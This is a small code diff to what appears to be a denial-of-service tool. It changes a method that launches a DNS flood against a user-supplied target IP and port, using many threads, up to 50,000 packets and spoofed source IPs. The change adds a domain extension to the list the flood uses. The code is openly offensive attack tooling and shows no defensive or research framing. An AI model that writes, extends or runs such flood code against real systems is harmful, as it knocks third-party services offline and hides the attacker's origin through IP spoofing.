@@ -73,7 +73,7 @@ class Main:
     def run_dns_flood_attack(self):
         target_ip, target_port, thread_count = self.get_attack_parameters()
         if target_ip and target_port and thread_count:
-            extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info", "world"]
+            extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info", "world", "click"]
             dns_flood = DnsFlood(target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
             self.attack_manager.run_attack(dns_flood, thread_count)
 
